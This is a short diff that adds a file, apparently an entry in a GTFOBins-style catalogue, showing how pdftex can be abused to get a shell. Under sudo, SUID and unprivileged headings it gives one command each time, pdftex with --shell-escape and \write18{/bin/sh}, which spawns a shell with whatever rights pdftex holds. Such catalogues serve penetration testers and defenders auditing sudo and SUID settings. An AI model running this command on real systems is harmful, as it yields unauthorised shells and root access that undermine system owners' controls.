@@ -1,0 +1,14 @@
+pdftex
+======
+
+Shell
+-----
+
+[Sudo]
+    pdftex --shell-escape '\write18{/bin/sh}\end'
+
+[SUID]
+    pdftex --shell-escape '\write18{/bin/sh}\end'
+
+[Unprivileged]
+    pdftex --shell-escape '\write18{/bin/sh}\end'
